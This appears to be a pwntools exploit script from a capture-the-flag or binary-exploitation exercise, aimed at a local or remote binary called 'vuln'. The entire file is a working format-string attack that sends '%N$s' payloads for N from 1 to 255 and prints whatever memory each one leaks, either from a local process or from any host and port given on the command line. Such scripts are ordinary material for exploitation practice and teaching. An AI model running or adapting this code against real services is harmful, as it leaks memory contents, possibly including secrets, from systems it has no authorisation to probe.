#!/usr/bin/env python3

import argparse
import pwn

pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices=["local", "remote"])
parser.add_argument("-t", "--target", type=str, default="", required=False)
parser.add_argument("-p", "--port", type=int, default=0, required=False)

args = parser.parse_args()

elf = pwn.ELF("./vuln")

for i in range(1, 256):
    payload = b"".join([
        b"%" + str(i).encode('utf-8') + b"$s",
    ])

    if args.destination == "local":
        p = elf.process()
    elif args.destination == "remote":
        if not args.target or not args.port:
            pwn.warning("Supply -t for target and -p for port")
            exit()
        p = pwn.remote(args.target, args.port)

    p.recvuntil(b">>")
    p.sendline(payload)

    response = p.recvall().decode("latin-1")
    print(f"Payload for i={i}: {response}")

    p.close()  # Close the connection before the next iteration
